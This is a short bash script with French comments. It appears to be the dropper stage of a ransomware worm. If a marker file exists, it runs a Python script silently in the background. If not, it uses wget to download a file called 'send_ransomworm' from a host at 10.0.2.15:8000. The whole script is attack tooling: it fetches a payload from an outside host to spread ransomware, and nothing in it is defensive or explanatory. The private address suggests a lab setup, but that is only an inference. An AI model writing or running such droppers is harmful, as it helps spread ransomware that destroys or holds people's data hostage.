#!/bin/bash

# file paths
FILE_TO_CHECK="$HOME/mon_fichier.txt"
PYTHON_SCRIPT="$HOME/mon_script.py"
URL="http://10.0.2.15:8000/send_ransomworm"

# Vérifiez si le fichier existe
if [ -f "$FILE_TO_CHECK" ]; then
    # Exécutez le script Python en arrière-plan
    python "$PYTHON_SCRIPT" &
else
    # Téléchargez le fichier depuis l'URL
    wget -P $HOME $URL
fi
